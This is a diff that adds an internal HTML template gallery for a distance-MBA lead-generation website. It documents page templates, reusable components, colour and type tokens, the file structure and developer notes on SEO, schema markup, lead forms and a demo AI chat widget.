+              <li class="feature-item">Business Analytics, Data Science & AI</li>
+              <li class="feature-item">Digital Marketing, Banking & Finance</li>
+              <li class="feature-item">Supply Chain, Healthcare, International Business</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+
+      <!-- Campaign LP -->
+      <div class="template-card">
+        <div class="template-preview">
+          <a href="landing-page-online-mba.html" target="_blank">
+            <iframe src="landing-page-online-mba.html" title="Campaign landing page template" loading="lazy" tabindex="-1"></iframe>
+            <div class="template-preview-overlay"><span class="preview-open-btn">Open ↗</span></div>
+          </a>
+        </div>
+        <div class="template-body">
+          <div class="template-meta">
+            <span class="template-type">Campaign LP</span>
+            <span class="template-num">06 / 07</span>
+          </div>
+          <div class="template-name">landing-page-online-mba.html</div>
+          <p class="template-desc">Designed exclusively for paid traffic. No navigation, no escape routes. Lead form sits above the fold. Minimal header with logo and phone only. Counsellor signature, university logos, FAQ accordion, mobile sticky actions. noindex so it does not compete with organic pages.</p>
+          <div class="template-tags">
+            <span class="tag saffron">Paid traffic only</span>
+            <span class="tag">No nav</span>
+            <span class="tag">Form above fold</span>
+            <span class="tag">noindex</span>
+            <span class="tag">Minimal footer</span>
+          </div>
+          <div class="template-actions">
+            <a href="landing-page-online-mba.html" target="_blank" class="btn-open">Open ↗</a>
+          </div>
+          <div class="template-features">
+            <div class="template-features-title">Reuse for all 27 campaign LPs</div>
+            <ul class="feature-list">
+              <li class="feature-item">All existing Google Ads landing pages</li>
+              <li class="feature-item">Meta Ads creatives landing destination</li>
+              <li class="feature-item">City-specific landing pages (Pune, Mumbai, etc.)</li>
+              <li class="feature-item">Zone pages (North, West, South, East India)</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Template 07 -->
+<section class="section" id="t7" style="background: var(--white);">
+  <div class="wrap">
+    <div class="section-label">Template 07</div>
+    <div class="section-title">Pillar Resource Guide — <span>AEO and GEO anchor</span></div>
+    <p class="section-sub">The longest-form template on the site. Sticky table of contents, 11 article sections, inline data tables, live EMI calculator, counsellor pull quotes, six-step how-to process, eight-question FAQ with schema — every element designed to be cited by AI answer engines.</p>
+
+    <div class="template-card-full">
+      <div class="template-preview-full">
+        <a href="resource-distance-mba-guide.html" target="_blank">
+          <iframe src="resource-distance-mba-guide.html" title="Pillar guide template" loading="lazy" tabindex="-1"></iframe>
+          <div class="template-preview-overlay">
+            <span class="preview-open-btn">Open full preview ↗</span>
+          </div>
+        </a>
+      </div>
+      <div class="template-body-full">
+        <div class="template-meta">
+          <span class="template-type">Pillar Guide</span>
+          <span class="template-num">Template 07 / 07</span>
+        </div>
+        <div class="template-name">resource-distance-mba-guide.html</div>
+        <p class="template-desc">The topical authority anchor for the entire site. Designed to rank for head-term queries ("distance MBA India"), be cited by ChatGPT/Perplexity, and capture mid-funnel visitors with multiple embedded lead CTAs across 11 sections.</p>
+        <div class="template-tags">
+          <span class="tag saffron">AEO/GEO optimised</span>
+          <span class="tag green">Schema: Article + FAQPage + BreadcrumbList</span>
+          <span class="tag">Sticky TOC with active state</span>
+          <span class="tag">Live EMI calculator</span>
+          <span class="tag">EEAT signals</span>
+          <span class="tag">3 embedded lead CTAs</span>
+        </div>
+        <div class="template-actions">
+          <a href="resource-distance-mba-guide.html" target="_blank" class="btn-open">Open template ↗</a>
+        </div>
+        <div class="template-features">
+          <div class="template-features-title">Reuse for all pillar guides</div>
+          <ul class="feature-list">
+            <li class="feature-item">Complete Guide to Online MBA in India 2026</li>
+            <li class="feature-item">Complete Guide to Executive MBA in India 2026</li>
+            <li class="feature-item">UGC-DEB Approved Universities List 2026</li>
+            <li class="feature-item">Fees and EMI Guide 2026</li>
+            <li class="feature-item">Eligibility Checker guide</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ COMPONENTS ============ -->
+<section class="section" id="components" style="background: var(--mist);">
+  <div class="wrap">
+    <div class="section-label">Component Library</div>
+    <div class="section-title">25+ reusable components, <span>one design system.</span></div>
+    <p class="section-sub">Every component below is defined in styles.css and used across multiple templates. Update the design system once; every template inherits the change automatically.</p>
+
+    <div class="comp-grid">
+
+      <div class="comp-card">
+        <div class="comp-card-icon">🧭</div>
+        <div class="comp-card-name">Sticky Navigation</div>
+        <div class="comp-card-desc">Backdrop-blur sticky header with dropdown menus for Programmes and Universities, phone number, and primary CTA button. Collapses to hamburger below 880px.</div>
+        <div class="comp-card-used">Used in: <span>All 7 templates (except LP)</span></div>
+      </div>
+
+      <div class="comp-card">
+        <div class="comp-card-icon">🎯</div>
+        <div class="comp-card-name">Hero Section</div>
+        <div class="comp-card-desc">Eyebrow label, Poppins headline with Lora italic span, subheadline, and action button row. The typographic signature of the brand.</div>
+        <div class="comp-card-used">Used in: <span>Homepage, Programme, University, Specialisation, Compare, Pillar</span></div>
+      </div>
+
+      <div class="comp-card">
+        <div class="comp-card-icon">🏷</div>
+        <div class="comp-card-name">Trust Strip</div>
+        <div class="comp-card-desc">"Trusted by 18,000+ professionals" label + UGC-DEB, AICTE, NAAC, AIU badge row. Appears below the hero on organic pages.</div>
+        <div class="comp-card-used">Used in: <span>Homepage, Programme, University, LP</span></div>
+      </div>
+
+      <div class="comp-card">
+        <div class="comp-card-icon">🟦</div>
+        <div class="comp-card-name">Mode Strip (4-col)</div>
+        <div class="comp-card-desc">Four cards: Distance, Online, Executive, Correspondence. Each card shows fee range, duration, structure, and best-for. Responsive to 2-col on tablet, 1-col on mobile.</div>
+        <div class="comp-card-used">Used in: <span>Homepage, Programme hub pages</span></div>
+      </div>
+
+      <div class="comp-card">
+        <div class="comp-card-icon">🏫</div>
+        <div class="comp-card-name">University Card</div>
+        <div class="comp-card-desc">University name, NAAC badge, fee range, duration, and "best for" one-liner. Available in 4-column grid (homepage) and full-detail template (university page).</div>
+        <div class="comp-card-used">Used in: <span>Homepage, Programme, Specialisation, LP, Pillar</span></div>
+      </div>
+
+      <div class="comp-card">
+        <div class="comp-card-icon">⚡</div>
+        <div class="comp-card-name">Quick Facts Strip</div>
+        <div class="comp-card-desc">5-cell horizontal data strip showing Fee, Duration, Mode, Eligibility, Accreditation for a specific programme. Collapses to 2-col on mobile.</div>
+        <div class="comp-card-used">Used in: <span>University page, Programme hub</span></div>
+      </div>
+
+      <div class="comp-card">
+        <div class="comp-card-icon">🟩</div>
+        <div class="comp-card-name">Who-Suits Grid</div>
+        <div class="comp-card-desc">Two cards side by side: "This is right for you if..." (green top border, ✓ bullets) and "Look elsewhere if..." (saffron top border, ✗ bullets). The brand's honesty mechanic.</div>
+        <div class="comp-card-used">Used in: <span>University page, Programme hub, Specialisation</span></div>
+      </div>
+
+      <div class="comp-card">
+        <div class="comp-card-icon">📊</div>
+        <div class="comp-card-name">Comparison Table</div>
+        <div class="comp-card-desc">3-column grid (Label | University A | University B) with navy header, alternating row background, and mobile reflow showing university names as data labels.</div>
+        <div class="comp-card-used">Used in: <span>Compare page, Programme hub, Pillar guide</span></div>
+      </div>
+
+      <div class="comp-card">
+        <div class="comp-card-icon">💬</div>
+        <div class="comp-card-name">Counsellor Block</div>
+        <div class="comp-card-desc">Dark navy container, counsellor avatar with saffron border, Lora italic pull quote, and name + role attribution. The trust moment on every page.</div>
+        <div class="comp-card-used">Used in: <span>Homepage, Programme, Compare, LP, Pillar</span></div>
+      </div>
+
+      <div class="comp-card">
+        <div class="comp-card-icon">💛</div>
+        <div class="comp-card-name">Counsellor Note (inline)</div>
+        <div class="comp-card-desc">Cream background with saffron left border, Lora italic quote, attributed to named counsellor. Used inline within article sections for human voice moments.</div>
+        <div class="comp-card-used">Used in: <span>University page, Compare, Pillar guide</span></div>
+      </div>
+
+      <div class="comp-card">
+        <div class="comp-card-icon">📋</div>
+        <div class="comp-card-name">Lead Form (4-field)</div>
+        <div class="comp-card-desc">Name, Phone (+91 prefix), Course of interest (select), City. Saffron submit button. Privacy line below. Used as the main conversion element across all pages.</div>
+        <div class="comp-card-used">Used in: <span>All 7 templates</span></div>
+      </div>
+
+      <div class="comp-card">
+        <div class="comp-card-icon">⚡</div>
+        <div class="comp-card-name">Lead Strip (inline)</div>
+        <div class="comp-card-desc">Dark navy 2-column block: headline + description on the left, single phone-field form on the right. Appears mid-article in long-form pages for mid-scroll capture.</div>
+        <div class="comp-card-used">Used in: <span>Pillar guide</span></div>
+      </div>
+
+      <div class="comp-card">
+        <div class="comp-card-icon">🤖</div>
+        <div class="comp-card-name">Aarya AI Chat Widget</div>
+        <div class="comp-card-desc">Floating bottom-right saffron button with online pulse indicator. Chat window with navy header, cream message area, quick-reply buttons, and text input. Context-aware opener per page.</div>
+        <div class="comp-card-used">Used in: <span>All 7 templates</span></div>
+      </div>
+
+      <div class="comp-card">
+        <div class="comp-card-icon">📱</div>
+        <div class="comp-card-name">Mobile Sticky Action Bar</div>
+        <div class="comp-card-desc">64px fixed bottom bar with 3 buttons: Call (☎), WhatsApp (💬), and Chat with Aarya (primary saffron). Visible only below 880px. Body padding-bottom auto-adjusts.</div>
+        <div class="comp-card-used">Used in: <span>All 7 templates</span></div>
+      </div>
+
+      <div class="comp-card">
+        <div class="comp-card-icon">❓</div>
+        <div class="comp-card-name">FAQ Accordion</div>
+        <div class="comp-card-desc">Click-to-expand items with + / − toggle and smooth reveal. FAQPage schema markup in page head maps to each question. Minimum 5 questions per page for schema value.</div>
+        <div class="comp-card-used">Used in: <span>All 7 templates</span></div>
+      </div>
+
+      <div class="comp-card">
+        <div class="comp-card-icon">🗂</div>
+        <div class="comp-card-name">Sticky TOC Sidebar</div>
+        <div class="comp-card-desc">11-item linked table of contents with active-state highlighting via IntersectionObserver. Sticky within the article column. Disappears on mobile. Sidebar CTA below the TOC.</div>
+        <div class="comp-card-used">Used in: <span>Pillar guide</span></div>
+      </div>
+
+      <div class="comp-card">
+        <div class="comp-card-icon">🧮</div>
+        <div class="comp-card-name">EMI Calculator</div>
+        <div class="comp-card-desc">Two selects (university and tenure) compute monthly EMI and total outgo instantly. No server calls. Results display in a dark navy 3-cell result strip.</div>
+        <div class="comp-card-used">Used in: <span>Pillar guide</span></div>
+      </div>
+
+      <div class="comp-card">
+        <div class="comp-card-icon">📐</div>
+        <div class="comp-card-name">Specialisation Grid (4-col)</div>
+        <div class="comp-card-desc">14 small cards: name, one-line description, saffron arrow. Each card is a link to the relevant specialisation page. Responsive to 2-col on mobile.</div>
+        <div class="comp-card-used">Used in: <span>Homepage</span></div>
+      </div>
+
+      <div class="comp-card">
+        <div class="comp-card-icon">"</div>
+        <div class="comp-card-name">Pull Quote Band</div>
+        <div class="comp-card-desc">Full-width dark navy section with centred Lora italic brand promise quote, saffron attribution label, and optional CTA. Used to anchor the brand voice mid-page.</div>
+        <div class="comp-card-used">Used in: <span>Homepage, Pillar guide</span></div>
+      </div>
+
+      <div class="comp-card">
+        <div class="comp-card-icon">🔢</div>
+        <div class="comp-card-name">Step Sequence</div>
+        <div class="comp-card-desc">Numbered steps with saffron circular step-number, heading, and body. Used for How It Works, How to Apply, and eligibility criteria flows.</div>
+        <div class="comp-card-used">Used in: <span>Pillar guide</span></div>
+      </div>
+
+      <div class="comp-card">
+        <div class="comp-card-icon">📢</div>
+        <div class="comp-card-name">Callout Box</div>
+        <div class="comp-card-desc">Two variants: saffron-50 background with saffron left border (informational), and dark navy with saffron left border (emphasis). Used for AEO-labelled one-line answers and critical warnings.</div>
+        <div class="comp-card-used">Used in: <span>Pillar guide, Programme hub</span></div>
+      </div>
+
+      <div class="comp-card">
+        <div class="comp-card-icon">📌</div>
+        <div class="comp-card-name">Verdict Banner</div>
+        <div class="comp-card-desc">Saffron-50 block with saffron left border immediately below the hero. Contains the one-line verdict statement for comparison pages. AEO-critical: AI engines extract this first.</div>
+        <div class="comp-card-used">Used in: <span>Compare page</span></div>
+      </div>
+
+      <div class="comp-card">
+        <div class="comp-card-icon">🏁</div>
+        <div class="comp-card-name">Data Table</div>
+        <div class="comp-card-desc">Full-width table with navy header row, alternating row shading, and coloured tag chips for notable values (high demand, EMI available). Horizontally scrollable on mobile.</div>
+        <div class="comp-card-used">Used in: <span>Pillar guide, Specialisation, Programme hub</span></div>
+      </div>
+
+      <div class="comp-card">
+        <div class="comp-card-icon">🔗</div>
+        <div class="comp-card-name">Navigation Breadcrumb</div>
+        <div class="comp-card-desc">Home › Category › Page Name text trail with BreadcrumbList schema. Appears below nav on university, programme, specialisation, and pillar pages.</div>
+        <div class="comp-card-used">Used in: <span>University, Programme, Pillar guide</span></div>
+      </div>
+
+      <div class="comp-card">
+        <div class="comp-card-icon">🏠</div>
+        <div class="comp-card-name">Footer</div>
+        <div class="comp-card-desc">4-column grid (Brand, Programmes, Universities, Company) on dark navy-dark. Includes brand tagline in Lora italic, company CIN and registered office, copyright, privacy and terms links.</div>
+        <div class="comp-card-used">Used in: <span>All 7 templates</span></div>
+      </div>
+
+    </div>
+  </div>
+</section>
+
+<!-- ============ DESIGN TOKENS ============ -->
+<section class="section" id="tokens" style="background: var(--white);">
+  <div class="wrap">
+    <div class="section-label">Design Tokens</div>
+    <div class="section-title">Colours, type, and spacing — <span>defined once.</span></div>
+    <p class="section-sub">All tokens are CSS custom properties defined in the <code style="background: var(--mist); padding: 2px 8px; border-radius: 4px; font-size: 13px;">:root</code> block of styles.css. Change a token once and every template reflects the update instantly.</p>
+
+    <div class="tokens-grid">
+      <!-- Colours -->
+      <div class="token-block">
+        <h4>Colour Palette</h4>
+
+        <div class="color-swatch">
+          <div class="swatch-box" style="background: #0B1F4D;"></div>
+          <div class="swatch-info"><div class="swatch-name">Navy <code style="font-size: 10px; background: var(--mist); padding: 1px 5px; border-radius: 3px;">--navy</code></div><div class="swatch-hex">#0B1F4D · Primary identity</div></div>
+        </div>
+        <div class="color-swatch">
+          <div class="swatch-box" style="background: #E8930E;"></div>
+          <div class="swatch-info"><div class="swatch-name">Saffron <code style="font-size: 10px; background: var(--mist); padding: 1px 5px; border-radius: 3px;">--saffron</code></div><div class="swatch-hex">#E8930E · CTAs, accents, MBA word</div></div>
+        </div>
+        <div class="color-swatch">
+          <div class="swatch-box" style="background: #FAF7F0; border: 1px solid #E2E8F0;"></div>
+          <div class="swatch-info"><div class="swatch-name">Cream <code style="font-size: 10px; background: var(--mist); padding: 1px 5px; border-radius: 3px;">--cream</code></div><div class="swatch-hex">#FAF7F0 · Page background</div></div>
+        </div>
+        <div class="color-swatch">
+          <div class="swatch-box" style="background: #1E3A8A;"></div>
+          <div class="swatch-info"><div class="swatch-name">Counsel Blue <code style="font-size: 10px; background: var(--mist); padding: 1px 5px; border-radius: 3px;">--navy-2</code></div><div class="swatch-hex">#1E3A8A · Lora italic, links</div></div>
+        </div>
+        <div class="color-swatch">
+          <div class="swatch-box" style="background: #1F2937;"></div>
+          <div class="swatch-info"><div class="swatch-name">Ink <code style="font-size: 10px; background: var(--mist); padding: 1px 5px; border-radius: 3px;">--ink</code></div><div class="swatch-hex">#1F2937 · Body text</div></div>
+        </div>
+        <div class="color-swatch">
+          <div class="swatch-box" style="background: #475569;"></div>
+          <div class="swatch-info"><div class="swatch-name">Slate <code style="font-size: 10px; background: var(--mist); padding: 1px 5px; border-radius: 3px;">--slate</code></div><div class="swatch-hex">#475569 · Captions, metadata</div></div>
+        </div>
+        <div class="color-swatch">
+          <div class="swatch-box" style="background: #10B981;"></div>
+          <div class="swatch-info"><div class="swatch-name">Verify Green <code style="font-size: 10px; background: var(--mist); padding: 1px 5px; border-radius: 3px;">--success</code></div><div class="swatch-hex">#10B981 · ✓ marks, success</div></div>
+        </div>
+      </div>
+
+      <!-- Type -->
+      <div class="token-block">
+        <h4>Type System</h4>
+        <div class="font-sample">
+          <div class="font-sample-text" style="font-family: 'Poppins', sans-serif; font-weight: 700; font-size: 26px; letter-spacing: -0.02em; color: var(--navy);">Display Heading</div>
+          <div class="font-sample-meta">Poppins 700 · --display · Headlines, logo wordmark</div>
+        </div>
+        <div class="font-sample">
+          <div class="font-sample-text" style="font-family: 'Poppins', sans-serif; font-weight: 500; font-size: 20px; letter-spacing: -0.01em; color: var(--navy);">Section Heading</div>
+          <div class="font-sample-meta">Poppins 500-600 · --display · h2, h3, nav</div>
+        </div>
+        <div class="font-sample">
+          <div class="font-sample-text" style="font-family: 'Inter', sans-serif; font-weight: 400; font-size: 16px; color: var(--ink);">Body text for reading. Inter is designed for screen legibility at every size.</div>
+          <div class="font-sample-meta">Inter 400-600 · --body · All body copy, UI labels</div>
+        </div>
+        <div class="font-sample">
+          <div class="font-sample-text" style="font-family: 'Lora', serif; font-style: italic; font-weight: 500; font-size: 19px; color: var(--navy-2);">The human voice inside the headline.</div>
+          <div class="font-sample-meta">Lora italic · --voice · Pull quotes, italic spans in headlines</div>
+        </div>
+
+        <div style="margin-top: 20px; padding: 16px; background: var(--saffron-50); border-radius: 8px; border-left: 3px solid var(--saffron);">
+          <p style="font-size: 13px; color: var(--navy); font-weight: 600; margin-bottom: 6px;">The italic signature rule</p>
+          <p style="font-size: 13px; color: var(--slate); margin: 0; line-height: 1.55;">Every page headline should include 2 to 4 words set in Lora italic (<code style="background: rgba(0,0,0,0.06); padding: 1px 5px; border-radius: 3px; font-size: 12px;">&lt;span class="ital"&gt;</code>) inside the Poppins headline. This is the typographic signature of the brand and must never be omitted.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ FILE STRUCTURE ============ -->
+<section class="section" id="files" style="background: var(--mist);">
+  <div class="wrap">
+    <div class="section-label">File Structure</div>
+    <div class="section-title">How the templates <span>are organised.</span></div>
+    <p class="section-sub">Two versions of each template exist: standalone (CSS embedded, for preview and sharing) and referenced (CSS in a shared file, for production). Your developer should build with the referenced version.</p>
+
+    <div class="file-tree">
+      <span class="ft-folder">html-templates/</span><br>
+      │<br>
+      ├── <span class="ft-folder">standalone/</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="ft-comment">← open directly in browser (CSS embedded)</span><br>
+      │&nbsp;&nbsp;&nbsp;├── <span class="ft-file-active">homepage.html</span><br>
+      │&nbsp;&nbsp;&nbsp;├── <span class="ft-file-active">university-nmims.html</span><br>
+      │&nbsp;&nbsp;&nbsp;├── <span class="ft-file-active">compare-nmims-vs-symbiosis.html</span><br>
+      │&nbsp;&nbsp;&nbsp;├── <span class="ft-file-active">programme-online-mba.html</span><br>
+      │&nbsp;&nbsp;&nbsp;├── <span class="ft-file-active">specialization-marketing.html</span><br>
+      │&nbsp;&nbsp;&nbsp;├── <span class="ft-file-active">landing-page-online-mba.html</span><br>
+      │&nbsp;&nbsp;&nbsp;├── <span class="ft-file-active">resource-distance-mba-guide.html</span><br>
+      │&nbsp;&nbsp;&nbsp;└── <span class="ft-file-active">index.html</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="ft-comment">← this file</span><br>
+      │<br>
+      ├── <span class="ft-folder">assets/</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="ft-comment">← for production (referenced version)</span><br>
+      │&nbsp;&nbsp;&nbsp;├── <span class="ft-file">styles.css</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="ft-comment">← complete design system (~2000 lines)</span><br>
+      │&nbsp;&nbsp;&nbsp;└── <span class="ft-file">chat-widget.js</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="ft-comment">← Aarya AI chat (replace with LLM backend)</span><br>
+      │<br>
+      ├── <span class="ft-file">homepage.html</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="ft-comment">← referenced version (uses assets/styles.css)</span><br>
+      ├── <span class="ft-file">university-nmims.html</span><br>
+      ├── <span class="ft-file">compare-nmims-vs-symbiosis.html</span><br>
+      ├── <span class="ft-file">programme-online-mba.html</span><br>
+      ├── <span class="ft-file">specialization-marketing.html</span><br>
+      ├── <span class="ft-file">landing-page-online-mba.html</span><br>
+      └── <span class="ft-file">resource-distance-mba-guide.html</span>
+    </div>
+
+    <div style="margin-top: 28px; padding: 20px 24px; background: var(--white); border-radius: 12px; border: 1px solid var(--hairline);">
+      <p style="font-size: 14px; color: var(--navy); font-weight: 600; margin-bottom: 8px;">For your developer</p>
+      <p style="font-size: 14px; color: var(--slate); margin: 0; line-height: 1.65;">The <strong style="color: var(--navy);">referenced version</strong> links to a single shared <code style="background: var(--mist); padding: 2px 6px; border-radius: 4px; font-size: 12px;">assets/styles.css</code>. When you update the CSS once, every page inherits the change. The <strong style="color: var(--navy);">standalone version</strong> has all CSS embedded inside each HTML file. Use standalone for previewing and sharing; use referenced for production.</p>
+    </div>
+  </div>
+</section>
+
+<!-- ============ DEVELOPER NOTES ============ -->
+<section class="section" id="dev" style="background: var(--white);">
+  <div class="wrap">
+    <div class="section-label">Developer Notes</div>
+    <div class="section-title">Before you build, <span>read these.</span></div>
+    <p class="section-sub">Nine critical points your developer should understand before integrating these templates into the actual CMS or website stack.</p>
+
+    <div class="note-grid">
+      <div class="note-card">
+        <div class="note-icon">🔤</div>
+        <div class="note-title">Google Fonts</div>
+        <div class="note-text">Templates load Poppins, Inter, and Lora from <code>fonts.googleapis.com</code>. They require an internet connection to render brand fonts. In production, self-host the font files for Core Web Vitals (eliminates render-blocking external request). Use <code>&lt;link rel="preconnect"&gt;</code> already included in each template.</div>
+      </div>
+
+      <div class="note-card">
+        <div class="note-icon">🤖</div>
+        <div class="note-title">Aarya AI Chat</div>
+        <div class="note-text">The chat widget in <code>chat-widget.js</code> is a static demo with hardcoded responses. In production, replace the <code>getReply()</code> function with an API call to the LLM backend (Claude claude-sonnet-4-6 via Anthropic API or equivalent). Pass the current page URL and context in the system prompt so responses are page-aware.</div>
+      </div>
+
+      <div class="note-card">
+        <div class="note-icon">📋</div>
+        <div class="note-title">Lead Forms</div>
+        <div class="note-text">All forms fire <code>alert('Lead captured (demo).')</code> on submit. Replace with your actual CRM webhook (<code>fetch('/api/leads', {...})</code>). Tag each form with the source template name and page path so leads can be attributed correctly in the CRM. The 4-field form (Name, Phone, Course, City) is the standard.</div>
+      </div>
+
+      <div class="note-card">
+        <div class="note-icon">🏷</div>
+        <div class="note-title">Schema Markup</div>
+        <div class="note-text">All schema is in <code>&lt;script type="application/ld+json"&gt;</code> blocks in the <code>&lt;head&gt;</code>. Validate every page with Google's Rich Results Test before launch. The FAQPage schema is the most critical — it enables Google FAQ rich snippets and is what AI engines parse first.</div>
+      </div>
+
+      <div class="note-card">
+        <div class="note-icon">📱</div>
+        <div class="note-title">Mobile Breakpoints</div>
+        <div class="note-text">The responsive breakpoints are: <code>880px</code> (nav collapses, grids go single-column, mobile sticky bar appears) and <code>660px</code> (smaller adjustments, tables reflow). All tested. The mobile sticky action bar adds <code>padding-bottom: 64px</code> to the body automatically via CSS media query.</div>
+      </div>
+
+      <div class="note-card">
+        <div class="note-icon">⚡</div>
+        <div class="note-title">Core Web Vitals</div>
+        <div class="note-text">Targets are LCP &lt;2.5s, INP &lt;200ms, CLS &lt;0.1. Templates achieve this by design (no layout shifts, no heavy JavaScript). In production: use <code>loading="lazy"</code> on images below the fold, convert images to WebP, inline critical CSS for above-fold content, and serve via CDN. The Lora/Poppins self-hosting will help significantly with LCP.</div>
+      </div>
+
+      <div class="note-card">
+        <div class="note-icon">🔗</div>
+        <div class="note-title">Internal Links</div>
+        <div class="note-text">All internal links currently point to <code>#</code> placeholders (except inter-template links within the gallery, which use relative paths). Before going live, replace every <code>href="#"</code> with the correct URL. The sitemap and content strategy document (v2.0) provides the full URL structure for every page type.</div>
+      </div>
+
+      <div class="note-card">
+        <div class="note-icon">🗺</div>
+        <div class="note-title">301 Redirects</div>
+        <div class="note-text">All 21+ old blog-style URLs must have 301 redirects to the new URL structure before launching. See Appendix A of the Sitemap & Content Strategy v2.0 for the complete migration map. Never delete a URL that has indexed search traffic — always redirect it.</div>
+      </div>
+
+      <div class="note-card">
+        <div class="note-icon">📄</div>
+        <div class="note-title">llms.txt File</div>
+        <div class="note-text">Deploy the <code>llms.txt</code> file at <code>https://distancembacollege.com/llms.txt</code> on day one. The full template is in Appendix D of the Sitemap & Content Strategy v2.0. This file is read by ChatGPT, Claude, Perplexity, and Gemini to understand which pages on the site are most authoritative to cite.</div>
+      </div>
+    </div>
+  </div>
+</section>
+</main>
+
+<!-- ============ FOOTER ============ -->
+<footer class="gallery-footer">
+  <div class="wrap">
+    <p><strong>Distance MBA College — HTML Template Gallery v1.0</strong></p>
+    <p style="margin-top: 8px;">Prepared by MagicWorks IT Solutions Pvt. Ltd. · June 2026 · Internal use only — do not publish this file</p>
+    <p style="margin-top: 8px; opacity: 0.7;">Reference: <a href="#">Brand Guidelines v2.0</a> · <a href="#">Sitemap & Content Strategy v2.0</a></p>
+  </div>
+</footer>
+
+<script>
+/* Quick nav active state on scroll */
+const navLinks = document.querySelectorAll('.quick-nav-link');
+const targets  = document.querySelectorAll('section[id]');
+
+window.addEventListener('scroll', () => {
+  let current = '';
+  targets.forEach(t => {
+    if (window.scrollY >= t.offsetTop - 120) current = t.id;
+  });
+  navLinks.forEach(l => {
+    l.classList.remove('active');
+    if (l.getAttribute('href') === '#' + current) l.classList.add('active');
+  });
+}, { passive: true });
+</script>
+
+</body>
+</html>
